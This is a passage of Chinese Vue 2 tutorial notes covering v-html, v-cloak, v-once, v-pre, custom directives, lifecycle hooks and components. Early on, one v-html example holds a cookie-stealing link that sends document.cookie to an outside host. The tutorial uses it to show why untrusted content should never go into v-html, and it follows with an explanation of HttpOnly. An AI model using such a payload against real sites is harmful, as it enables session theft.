2. 一定要在可信的内容上使用`v-html`，永远不要用在用户提交的内容上！！！

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/efab4c109966f7b02974ef24ef3d641e.png#pic_center)

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/f00ff2ddb3efc43746d1d9d117636c85.png#pic_center)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <!--准备好一个容器-->
    <div id="root">
        <div>你好，{{name}}</div>
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>
    <script>
        new Vue({
            el: '#root',
            data: {
                name: '尚硅谷',
                str: '<h3>你好啊!</h3>',
                str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点击这里</a>' // 或者使用动态属性值
            }
        })
    </script>
</body>
</html>
```

- **查看网页的cookie**
    
    1. 在要编辑的网页上打开开发者工具（右键-检查 或者 F12）
    2. 在开发者工具中选择”应用程序”选项卡
    3. 展开“存储”下的“Cookie”，就可以看到当前页面的cookie信息了
    
    或者：在控制台输入`console.log(document.cookie)`（得到部分）
    
- **HttpOnly**
    
    HttpOnly是包含在Set-Cookie HTTP响应头文件中的附加标志。
    
    生成cookie时使用HttpOnly标志有助于降低客户端脚本访问受保护cookie的风险（如果浏览器支持）
    
    如果某一个Cookie 选项被设置成 **HttpOnly = true** 的话，这也就是上面控制台无法得到浏览器页面全部cookie的原因
    

#### 提高用户体验的细节优化–JS阻塞

JavaScript 阻塞通常指的是在网页中，JavaScript 代码的执行可能会阻止其他代码的执行，从而影响页面的加载和渲染

- 一个delay-server的服务器（使用）

可以自由决定延迟时间

- 调节浏览器网速

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/11ad366a2b07a49e28c90f3931fc55e3.png#pic_center)

无法控制准确几秒（pass）

1. 样例1

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<!--     <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script> -->
    <script type="text/javascript" src="http://localhost:8080/resource/5s/vue.is"></script>    
    <title>Document</title>
</head>
<body>
    <div id="root">
        <h2>{{name}}</h2>
    </div>
    <script>
    console.log(1);
        const vm=new Vue({
            el:'#root',
            data:{
                name:'尚硅谷'
            },
        })
    </script>
</body>
</html>
```

先等5s，然后渲染模板执行脚本

2. 样例2

```html
<body>
    <div id="root">
        <h2>{{name}}</h2>
    </div>
    <script type="text/javascript" src="http://localhost:8080/resource/5s/vue.is">
    <script>
    console.log(1);
        const vm=new Vue({
            el:'#root',
            data:{
                name:'尚硅谷'
            },
        })
    </script>
</body>
</html>
```

先呈现没有解析过的模板，看到{{name}}，等5s后执行脚本，把数据响应到页面

3. 解决

```html
	<style>
        [v-cloak]{
			display:none;
		}
    </style>
……
<body>
    <div id="root">
        <!-- 特殊指令，只有名，没有值 -->
        <h2 v-cloak>{{name}}</h2>
    </div>
    <script type="text/javascript" src="http://localhost:8080/resource/5s/vue.is">
    <script>
    console.log(1);
        const vm=new Vue({
            el:'#root',
            data:{
                name:'尚硅谷'
            },
        })
    </script>
</body>
```

> 当 Vue 实例创建后，它会解析模板中的 `v-cloak` 指令，并应用 CSS 样式规则。
> 
> 由于 `v-cloak` 指令的存在，带有该指令的元素在 Vue 实例创建前是隐藏的。
> 
> 一旦 Vue 实例解析完模板，它会将数据属性 `name` 的值 `'尚硅谷'` 绑定到 `<h2>` 元素上，并将其显示出来。
> 
> > 效果就是当网速不佳时，页面不会出现未经解析的模板

**总结：**

`v-cloak`指令（没有值）：

1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉`v-cloak`属性
2. 使用css配合`v-cloak`可以解决网速慢时页面展示出`{{xxx}}`的问题

#### v-once 指令

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <div id="root">
        <h2 v-once>初始的n值是:{{n}}</h2>
        <h2>当前的n值是:{{n}}</h2>
        <button @click="add">点我n+1</button>
    </div>
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                n:1
            },
        methods: {
            add(){
                this.n++
            }
        },
        })
    </script>
</body>
</html>
```

**总结：**

`v-once`指令：

1. `v-once`所在节点在初次动态渲染后，就视为静态内容了
2. 以后数据的改变不会引起`v-once`所在结构的更新，可以用于优化性能

#### v-pre 指令

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <div id="root">
        <!-- 不编译 -->
        <h2 v-pre>vue其实很简单</h2>
        <h2 v-pre>当前的n值是:{{n}}</h2>
        <button v-pre @click="add" a="1">点我n+1</button>
        
        <!-- 正常 -->
        <!-- <h2>vue其实很简单</h2>
        <h2>当前的n值是:{{n}}</h2>
        <button @click="add">点我n+1</button> -->
    </div>
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                n:1
            },
        methods: {
            add(){
                this.n++
            }
        },
        })
    </script>
</body>
</html>
```

**总结：**

`v-pre`指令：

1. 跳过其所在节点的编译过程。
2. 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

#### 1.13.1. 自定义指令

##### 自定义指令创建案例

一个小demo分析：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        .demo {
            background-color: pink;
        }
    </style>
</head>
<body>
    <button>点击创建输入框</button>
    <script>
        // 代码都没有错,只是执行时机的问题
        const btn=document.querySelector('button')
        btn.addEventListener('click',()=>{
            const input=document.createElement('input')// 创建一个input框【此时还没放到页面上】

            // 大部分代码还是可以在这里实现的【操作可以生效】
            input.className = 'demo'
            input.value = 99
            input.onclick =()=>{alert(1)}

            // input.focus()  
            // 假如代码在这里,自动获取焦点无效
            // 因为这是在元素存在之前执行的
            input.parentElement.style.backgroundColor='blue'//【操作不可以生效】

            document.body.appendChild(input)// 将input框放到body中【这一步就放到了页面上】

            // 但是有部分代码确实是必须在生成之后执行
            input.focus()
            input.parentElement.style.backgroundColor='blue'
        })
    </script>
</body>
</html>
```

案例：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <!-- 
		需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
		需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
	-->
    <div id="root">
    <h2>当前的n值是：<span v-text="n"></span></h2>
    <h2>放大10倍后的n值是：<span v-big="n"></span></h2>
    <button @click="n++">点我n+1</button>
    <hr>
    <!-- 自动获取焦点可以添加属性 autofocus -->
    <input type="text" v-fbind:value="n">
    </div>
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                n:1
            },
            directives:{
                    // 写法1:对象
                // big:{
                //     // k:v
                // }
                    // 写法2:函数
                // big:function(a,b){
                //     console.log(a);//<span></span> 真实的dom元素
                //     console.log(b);
                //     /* 对象
                //     {
                //         "name": "big",
                //         "rawName": "v-big",
                //         "value": 1,         // n的值
                //         "expression": "n",
                //         "modifiers": {},
                //         "def": {}
                //     } 
                //      */
                // }
                big(element,binding){
                    // big函数被调用的时候:
                    // 1. 指令与元素成功绑定时(一上来) bind
                    // 2. 指令所在的模板被重新解析时  update
                    console.log(element,binding.value);
                    element.innerText=binding.value*10
                },

                // fbind(element,binding){
                //     element.value=binding.value
                //     // element.focus()
                //     // 代码无法奏效,时机不对
                    
                //     // 函数形式已经找不到合适时机了,不得不换成对象写法
                // }
                fbind:{
                    // 指令与元素成功绑定时(一上来)
                    bind(element,binding){
                        console.log('bind');
                        // 元素已经创建,但是还没有放到页面
                        element.value=binding.value
                    },
                    // 指令所在元素被插入页面时
                    inserted(element,binding){
                        console.log('inserted');
                        element.focus()
                    },
                    // 指令所在模板被重新解析时
                    update(element,binding) {
                        console.log('update');
                        element.value=binding.value
                    },
                // 第一个跟第三个的逻辑往往相同,简写方式相当于只写了这两个
                }
            }
        })
    </script>
</body>
</html>
```

再分析：

```html
<body>
    <!--  -->
    <div id="root">
        <h2>当前的n值是：<span v-text="n"></span></h2>
                                    <!-- 不用bigNumber -->
        <!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span></h2> -->
        <h2>放大10倍后的n值是：<span v-big="n"></span></h2>
        <button @click="n++">点我n+1</button>
        <input type="text" v-fbind:value="n">
    </div>

    <hr>

    <!--  -->
    <div id="root2">
        <h2>当前的x值是：<span v-text="x"></span></h2>
        <h2>放大10倍后的x值是：<span v-big="x"></span></h2>
        <button @click="x++">点我n+1</button>
        <!-- 第一步:无法使用v-fbind -->
        <input type="text" v-fbind:value="x">
    </div>


    <script>
        // 第二步:将其变成全局的(全局的必须放前面)
            // 类似过滤器
            // filters ---> filter
            // directives ---> directive
        Vue.directive('fbind',{
                    bind(element, binding) {
                        element.value = binding.value;
                        console.log('fbind-bind',this);//window
                    },
                    inserted(element, binding) {
                        element.focus();
                        console.log('fbind-inserted',this);//window
                    },
                    update(element, binding) {
                        element.value = binding.value;
                        console.log('fbind-update',this);//window
                    },
                })
        // 同理,另一个操作一样
        Vue.directive('big',function(element, binding) {
                    console.log(element, binding.value);
                    element.innerText = binding.value * 10;
                    console.log('big',this);//window
                })

        const vm = new Vue({
            el: '#root',
            data: {
                n: 1
            },
            directives: {
                // 不能直接用big-number
                // big(element, binding) {
                //     console.log(element, binding.value);
                //     element.innerText = binding.value * 10;
                //     console.log('big',this);//window
                // },
                // 'big-number'(element, binding) {
                //     console.log(element, binding.value);
                //     element.innerText = binding.value * 10;
                // },

                // 第三步:注销局部
                // fbind: {
                //     bind(element, binding) {
                //         element.value = binding.value;
                //         console.log('fbind-bind',this);//window
                //     },
                //     inserted(element, binding) {
                //         element.focus();
                //         console.log('fbind-inserted',this);//window
                //     },
                //     update(element, binding) {
                //         element.value = binding.value;
                //         console.log('fbind-update',this);//window
                //     },
                // }
            }
        })
        
        // 第一步:无法使用v-fbind,局部指令需要变成全局的
        new Vue({
            el:'#root2',
            data:{
                x:10
            }
        })
    </script>
</body>
```

注意：

1. 指令定义时不加v-，但使用时要加v-
    
2. 自定义指令名称由多个单词组成，多个单词之间要用连字符（-）连接，不使用驼峰命名法，如，`v-big-number`，不用`v-bigNumber`
    
3. 自定义指令内部 `this` 指向
    
    在指令的回调函数（无论是对象式中的 `bind`、`inserted`、`update` 还是函数式）中，`this` 默认指向全局对象，而不是 Vue 实例
    
4. 局部指令变全局指令
    
    - **局部指令**：在 Vue 实例的 `directives` 选项中定义的自定义指令仅在该实例中可用，其他Vue实例中用不了
    - **全局指令**：通过 `Vue.directive` 方法注册的自定义指令在整个 Vue 应用中可用
    - **优先级**：全局指令的优先级高于局部指令。如果全局和局部指令有相同的名称，全局指令会被优先使用。
    - **注销局部指令**：如果您需要将局部指令变成全局指令，可以在全局范围内注销局部指令的定义。

###### 1. 注册全局指令

```js
Vue.directive('my-directive', function(el, binding){ 
	el.innerHTML = binding.value.toupperCase()
})
```

###### 2. 注册局部指令

```JS
directives: {
  'v-my-directive': {
    bind(el, binding) {
      el.innerHTML = binding.value.toUpperCase(); 
    }
  }
}
```

使用指令 `v-my-directive='xxx'`

###### 3. 配置对象中常用的3个回调

- (1).bind:指令与元素成功绑定时调用
- (2).inserted:指令所在元素被插入页面时调用
- (3).update:指令所在模板结构被重新解析时调用

### 1.14. Vue 实例生命周期

#### **1.14.1.** **效果**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <div id="root">
        <h2 :style="{opacity}">{{text}}
            <!-- 3. 无限循环:数据改变了，页面一直在渲染导致重复定义了很多定时器,疯狂渲染闪动 -->
            <!--  {{change()}} -->
        </h2>
    </div>
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                text:'欢迎学习vue',
                opacity:1
            },
            // 2. 函数定义
            methods: {
                // change(){
                //     setInterval(()=>{
                //         vm._data.opacity-=0.01
                //         if(vm._data.opacity<=0){
                //             vm._data.opacity=1
                //         }
                //     },16)
                // }
            },
            // 4. 挂载
            // Vue完成模板的解析并把真实的DOM元素放入页面后(挂载完毕)调用mounted
            mounted() {
                console.log('mounted');
                setInterval(()=>{
                    vm._data.opacity-=0.01
                    if(vm._data.opacity<=0){
                        vm._data.opacity=1
                    }
                },16)
            },
        })
        // // 2. 需要被调用(又在实例外 pass)
        // window.οnlοad=()=>{
        //     vm.change()
        // }

        // 1. 通过外部的定时器实现(不推荐)
        // setInterval(()=>{
        //     vm._data.opacity-=0.01
        //     if(vm._data.opacity<=0){
        //         vm._data.opacity=1
        //     }
        // },16)
    </script>
</body>
</html>
```

注意：

1. js 不善于处理小数，0.1 + 0.2 不一定等于0.3
    
    当通过js判断一个不断缩小的变量的值是否缩小到0时，可以通过<=0进行判断；如果直接判断===0，可能会出现递减的值取不到0的情况
    
2. mounted的执行时期：Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
    
3. 初始的真实DOM：第一次解析模板后生成的真实DOM
    
4. 回调函数：函数是我自己定义的，但我自己没有主动调用，但这个函数还是执行了
    

###### 生命周期：

```
1. 又名：生命周期回调函数、生命周期函数、**生命周期钩子**
2. 是什么：Vue在关键时刻帮我们调用的一些**特殊名称的函数**【这些函数我们可以提前准备好，等着Vue去帮我们调用】
3. 生命周期函数的**名字不可更改**，但函数的具体内容是程序员根据需求编写的
4. 生命周期函数中的**this**指向是**vm或组件实例对象**
```

#### **1.14.2.** **生命周期流程图**

官网的图示：[Vue 实例 — Vue.js (vuejs.org)]

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/80e4e3119ceaa81fa7ae8ca06f838973.png#pic_center)

添加了注释的图示：  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/a4b5ac7667fba49e11faf9ba2e31bfa1.png#pic_center)

注：

1. 上图中绿色色块代表一个个的环节，红色字体代表一个个生命周期函数，黄色色块代表判断操作
2. 上图中有三个生命周期没有体现出来，分别是nextTick、actived、deactived

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <div id="root" :x="n">
        <p>n的值为：{{n}}</p>
        <button @click="add">点我n+1</button>
    </div>
    <script>
        const vm=new Vue({
			el:'#root',
            // 完全替换原先<div id="root"></div>,属性无
			// template:`
			// 	<div>
			// 		<h2>当前的n值是：{{n}}</h2>
			// 		<button @click="add">点我n+1</button>
			// 	</div>
			// `,

            // 欺骗无效：Cannot use <template> as component root element because it may contain multiple nodes.
            // template:`
			// 	<template>
			// 		<h2>当前的n值是：{{n}}</h2>
			// 		<button @click="add">点我n+1</button>
			// 	</template>
			// `,
            
			data:{
				n:1
			},
			methods: {
				add(){
					console.log('add')
					this.n++
				},
				bye(){
					console.log('bye')
					this.$destroy()
				}
			},
			watch:{
				n(){
					console.log('n变了')
				}
			},
			beforeCreate() {
				console.log('beforeCreate')
			},
			created() {
				console.log('created')
			},
			beforeMount() {
				console.log('beforeMount')
			},
			mounted() {
				console.log('mounted')
			},
			beforeUpdate() {
				console.log('beforeUpdate')
			},
			updated() {
				console.log('updated')
			},
			beforeDestroy() {
				console.log('beforeDestroy')
			},
			destroyed() {
				console.log('destroyed')
			},
		})
	</script>
</body>
</html>
```

Vue.js 实例的生命周期可以分为**三个阶段**：**挂载（Mounting）、更新（Updating）和销毁（Destroying）**，每个阶段都有相应的事件钩子（生命周期钩子）可以被使用，这些钩子允许我们在特定的时刻执行代码

##### 1. 挂载流程：

- `Init Events & Liftcycle`：
    - 制定一些规则，比如定义生命周期函数，各生命周期函数的调用时机；
    - 又比如遇到事件修饰符后事件的处理方式；
    - 这一步，vm身上还没有vm._data，数据代理，比如vm.n，n是data中的一个配置项，也是没有的
- `beforeCreate`【生命周期，**指的是创建数据监测和数据代理之前**】：
    - 此时**无法**通过vm访问data中的数据【Vue收到的data还没有开始解析，vm身上还没有_data】和methods中的方法
- `Init injection & reactivity`：
    - 初始化数据监测相关的操作【给data中的对象属性增加setter和getter、包装操作数组的七个方法】和数据代理相关的操作【vm对象代理_data对象】
- `created`【生命周期，**指的是创建数据监测和数据代理之后**】：
    - 可以通过vm访问data中的数据和methods中的方法
- `Compile el's outerHTML as template`：
    - 当new Vue时传入的配置对象中**不包含template配置项**时会来到该环节，el配置项的值可以是一个选择器，根据选择器能够找到模板中的一段HTML代码片段，这里说的是el的outerHTML，outerHTML和innerHTML的区别如下
        - outerHTML：包含当前标签
        - innerHTML：当前标签内部的标签

##### 2.更新流程：

##### 3.销毁流程：

#### debugger

在代码中加一句 `debugger`，然后到浏览器中刷新页面，这时候浏览器就会在 `debugger` 语句那停止执行

#### **1.14.3.** **vue** **生命周期分析**

1. 初始化显示

* beforeCreate()

* created()

* beforeMount()

* mounted()

\2) 更新状态: this.xxx = value

* beforeUpdate()

* updated()

\3) 销毁vue 实例: vm.$destory()

* beforeDestory()

* destoryed()

#### 1.14.4. 常用的生命周期方法

\1. mounted(): 发送ajax 请求, 启动定时器等异步任务

\2. beforeDestory(): 做收尾工作, 如: 清除定时器

## 第 2 章：Vue 组件化编程

[Why Vue-教育-高清完整正版视频在线观看-优酷 (youku.com)](https://v.youku.com/v_show/id_XMzMwMTYyODMyNA==.html?spm=a1z3jc.11711052.0.0&isextonly=1)

### 2.1 模块与组件、模块化与组件化

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/43538b3f8974294ebd105d474266e2fc.png#pic_center)  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/5737d74fd80480e8756d19db734478a8.png#pic_center)  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/8c0cdc59478524f56f3f3d443e6866cd.png#pic_center)

#### 2.1.1. 模块

1. 理解: 向外提供特定功能的 js 程序, 一般就是一个js 文件
    
2. 为什么: js 文件很多很复杂
    
3. 作用: 复用js, 简化js 的编写, 提高js 运行效率
    

#### 2.1.2. 组件

1. 理解: 用来实现局部(特定)功能效果的代码集合(html/css/js/image……)
    
2. 为什么: 一个界面的功能很复杂
    
3. 作用: 复用编码, 简化项目编码, 提高运行效率
    

#### 2.1.3. 模块化

当应用中的js 都以模块来编写的, 那这个应用就是一个模块化的应用。

#### 2.1.4. 组件化

当应用中的功能都是多组件的方式来编写的, 那这个应用就是一个组件化的应用。

### 2.2. 非单文件组件

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<!-- 1.  -->
<!-- <body>
    <div id="root">
        <h2>学校名称：{{school.name}}</h2>
        <h2>学校地址：{{school.address}}</h2>
        <hr>
        <h2>学生名称：{{student.name}}</h2>
        <h2>学生年龄：{{student.age}}</h2>
    </div>
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                school:{
                    name:'尚硅谷',
                    address:'广东广州'
                },
                student:{
                    name:'小黄',
                    age:18
                }
            }
        })
    </script>
</body> -->

<!-- 2.  -->
<!-- <body>
    <div id="root">
        <h2>学校名称：{{schoolName}}</h2>
        <h2>学校地址：{{address}}</h2>
        <hr>
        <h2>学生名称：{{studentName}}</h2>
        <h2>学生年龄：{{age}}</h2>
    </div>
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                schoolName:'尚硅谷',
                address:'广东广州',
                studentName:'小黄',
                age:18 
            }
        })
    </script>
</body> -->

<!-- 3.  -->
<body>
    <div id="root">
        <h2>{{text}}</h2>
        <!-- 全局组件 -->
        <hello></hello>
        <hr>
        <!-- <h2>学校名称：{{schoolName}}</h2>
        <h2>学校地址：{{address}}</h2>
        <hr>
        <h2>学生名称：{{studentName}}</h2>
        <h2>学生年龄：{{age}}</h2> -->

        <!-- 第三步:编辑组件标签 -->
        <school></school>
        <hr>
            <!-- 两个相同组件之间的数据也互不影响 -->
        <student></student>
        <hr>
        <student></student>
    </div>
    <hr>
    <div id="root2">
        <!-- 全局组件 -->
        <hello></hello>
        <h2>我是第二个实例</h2>
        <student></student>
    </div>
    <script>
        // 第一步:创建school组件
        const school=Vue.extend({
            // el:'#root',
            // 一定不要写e1配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器
            template:
            `
                <div>
                    <h2>学校名称：{{schoolName}}</h2>
                    <h2>学校地址：{{address}}</h2>
                    <button @click="showSchoolName()">点我提示学校名称</button>
                </div>
            `,

            // 不要写对象形式,改成函数式
            // data:{
            //     schoolName:'尚硅谷',
            //     address:'广东广州',
            //     studentName:'小黄',
            //     age:18 
            // }
            data(){
                return {
                    schoolName:'尚硅谷',
                    address:'广东广州'
                }
            },
            methods: {
                showSchoolName(){
                    alert(this.schoolName)
                }
            },
        })

        // 第一步:创建student组件
        const student=Vue.extend({
            template:
            `
                <div>
                    <h2>学生名称：{{studentName}}</h2>
                    <h2>学生年龄：{{age}}</h2>
                </div>
            `,
            data(){
                return {
                    studentName:'小黄',
                    age:18 
                }
            },
            
        })

        // 创建全局组件
        const hello = Vue.extend({
            template:`<h2>{{hello}}</h2>`,
            data(){
                return{
                    hello:'hello我是全局组件~欢迎学习vue'
                }
            }
        })
        // 注册全局组件
        // 注册组件要写在创建组件的下面,要不然会报错
        Vue.component('hello',hello)

        const vm=new Vue({
            el:'#root',
            data:{
                text:'你好啊'
            },
            // 第二步:注册组件(局部注册)
            components:{
                school,
                student,
            },
        })

        new Vue({
            el:'#root2',
            components:{
                // 未注册就使用报错
                // Unknown custom element: <student> - did you register the component correctly? For recursive components, make sure to provide the "name" option.
                student,
            }
        })
    </script>
</body>

</html>
```

#### **⭐Vue中使用组件的三大步骤:**

1. **定义组件(创建组件)**
2. **注册组件**
3. **使用组件(写组件标签)**

##### 一、如何定义一个组件?

​ 使用`Vue.extend(options)`创建，其中`options`和`new Vue(options)`时传入的那个`options`几乎一样，但也有点区别

- 区别如下：
    
    1. el不要写，为什么? — 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器
        
    2. data必须写成函数，为什么? — 避免组件被复用时，数据存在引用关系
        
- 备注：使用template可以配置组件结构
    

> 使用 `Vue.extend()` 方法来创建**组件构造器**，并通过它来创建组件实例
> 
> 组件构造器创建的组件实例具有与 Vue 实例类似的选项，如 `data`、`methods`、`computed` 等
> 
> ```js
> const MyComponent = Vue.extend({
>   // 组件选项
>   data() {
>     return {
>       message: 'Hello, Vue!'
>     };
>   },
>   template: '<div>{{ message }}</div>'
> });
> ```

##### 二、如何注册组件?

1. 局部注册：靠new Vue的时候传入components选项
    
2. 全局注册：靠Vue.component('组件名’组件)
    

> 注册组件的方式有两种：**局部注册和全局注册**
> 
> - **局部注册**：在 Vue 实例的 `components` 选项中注册组件。这样注册的组件只能在注册它的 Vue 实例的作用域内使用
>     
>     ```js
>     const vm = new Vue({
>       el: '#app',
>       components: {
>         MyComponent
>       }
>     });
>     ```
>     
> - **全局注册**：通过 `Vue.component()` 方法全局注册组件。这样注册的组件可以在整个 Vue 应用中使用
>     
>     ```js
>     Vue.component('MyComponent', MyComponent);
>     ```
>     

##### 三、编写组件标签:

> 在 Vue 模板中，通过标签的形式使用组件
> 
> ```html
> <div id="app">
>   <my-component></my-component>
> </div>
> ```

##### 五、几个注意点：

1. **组件名**
    
    ```html
    <body>
        <div id="root">
            <h1>{{msg}}</h1>
            <!-- 1.  -->
            <!-- <school></school> -->
            <!-- 2.  -->
            <!-- <MySchool></MySchool> -->
            <my-school></my-school>
        </div>
    <script>
        // 1.
        // const school=Vue.extend({
        // 2. 
        // const MySchool=Vue.extend({
        const school=Vue.extend({
            template:
            `
            <div>
                <h2>学校名称：{{name}}</h2>
                <h2>学校地址：{{address}}</h2>
            </div>
            `,
            data(){
                return {
                    name:'尚硅谷',
                    address:'广东广州'
                }
            }
        })
    
        const vm=new Vue({
            el:'#root',
            data:{
                msg:'hello~'
            },
            components:{
                // 1. 正常单个单词
                // school
                // 2. 多个单词组合
                //          推荐写法:(单词首字母均大写) ↓但是报错呈现不一样,需要在脚手架情况下
                //          Unknown custom element: <myschool> - did you register the component correctly? For recursive components, make sure to provide the "name" option.
                // MySchool
                //          中间-隔开
                'my-school':school//这里无法简写
            }
        })
    </script>
    </body>
    ```
    
    - 由一个单词组成
        
        - 第一种写法：首字母小写，如`school`
        - 第二种写法：首字母大写，如`School`
    - 由多个单词组成
        
        - 第一种写法：kebab-case命名，如`my-school`
        - 第二种写法：camelCase【大驼峰】命名，如`MySchool`，此时需要Vue脚手架的支持
    - 注意：
        
        - 组件名尽可能回避HTML中已有的元素名称，例如:h2、H2都不行
            - h2：`[Vue warn]: Do not use built-in or reserved HTML elements as component id: h2`
            - H2：被转换成h2，但是效果不呈现，也不报错
        - 可以使用`name`配置项指定组件在开发者工具中呈现的名字，如果创建组件时未指定name配置项，Vue开发者工具中显示的组件名就是注册组件时用的组件名
        
        ```html
        <body>
            <div id="root">
                {{msg}}
                <school></school>
            </div>
            <script>
                const school=Vue.extend({
                    name:'schoolComponent',
                    template:
                    `
                    <div>
                        <h2>学校名称：{{name}}</h2>
                        <h2>学校地址：{{address}}</h2>
                    </div>
                    `,
                    data(){
                        return{
                            name:'尚硅谷',
                            address:'广东广州'
                        }
                    }
                })
        
                const vm=new Vue({
                    el:'#root',
                    data:{
                        msg:'hello~'
                    },
                    components:{
                        school,
                    }
                })
            </script>
        </body>
        ```
        
        ![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/30bae97cb6c83155963b8a96ab0d7a4f.png#pic_center)
        
2. **关于组件标签**
    
    - 第一种写法:`<school></school>`
        
    - 第二种写法:`<school/>`【自闭合】（需要Vue脚手架支持，虽然单个的自闭合标签不会报错）
        
        > 备注:不用使用脚手架时，`<school/>`会导致后续组件不能渲染
        
3. **定义组件的简写形式**
    
    `const school= Vue.extend({})`可以简写成`const school= {}`，如下所示，二者是等效的
    
    - 使用`Vue.extend({})`定义组件
    
    ```js
    const school = Vue.extend({
        template:`
            <div>
                <h2>公司名称：{{name}}</h2>
                <h2>公司地址：{{address}}</h2>
            </div>
        `,
        data(){
            return {
            	name:'尚硅谷',
                address:'广东广州'
            }
        }
    })
    ```
    
    - 直接将组件写成一个对象
    
    ```js
    const school ={
        template:`
            <div>
                <h2>公司名称：{{name}}</h2>
                <h2>公司地址：{{address}}</h2>
            </div>
        `,
        data(){
            return {
            	name:'尚硅谷',
                address:'广东广州'
            }
        }
    }
    ```
    
4. **组件的嵌套**
    
    ```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
        <title>Document</title>
    </head>
    <body>
        <div id="root">
            {{msg}}
            <school>
                <student></student>
            </school>
        </div>
        <script>
        // 成绩组件
            const grade=Vue.extend({
                name:'gradeComponent',
                template:
                `
                <div>
                    <h2>科目名称：{{name}}</h2>
                    <h2>考试成绩：{{score}}</h2>
                </div>
                `,
                data(){
                    return{
                        name:'数据结构',
                        score:88
                    }
                }
            })
    
        // 学生组件
            const student=Vue.extend({
                name:'studentComponent',
                template:
                `
                <div>
                    <h2>学生名称：{{name}}</h2>
                    <h2>学生年龄：{{age}}</h2>
                    <grade></grade>
                </div>
                `,
                data(){
                    return{
                        name:'小黄',
                        age:18
                    }
                },
                components:{
                    grade
                }
            })
    
    
        // 学校组件
            const school=Vue.extend({
                name:'schoolComponent',
                template:
                `
                <div>
                    <h2>学校名称：{{name}}</h2>
                    <h2>学校地址：{{address}}</h2>
                    <student></student>
                </div>
                `,
                data(){
                    return{
                        name:'尚硅谷',
                        address:'广东广州'
                    }
                },
                components:{
                    // 
                    // Uncaught ReferenceError:Cannot access 'student' before initialization
                    student
                }
            })
    
            const vm=new Vue({
                el:'#root',
                data:{
                    msg:'hello~'
                },
                components:{
                    school,
                }
            })
        </script>
    </body>
    </html>
    ```
    
    ![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/18fb535347fcf02986fc6a9b276309d5.png#pic_center)
    
    注意：
    
    1. 组件的定义和注册应该按照它们在模板中使用的顺序进行
        - 如果一个组件在另一个组件的模板中作为子组件使用，那么子组件的定义应该在外部组件的定义之前**【子组件，先定义】**
    2. 嵌套组件的使用是在父组件的模板中

另外：通常情况下，为了更有效地管理这些组件，会创建一个 `App` 组件作为项目的**根组件**，然后将其他组件作为子组件包含在其中。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
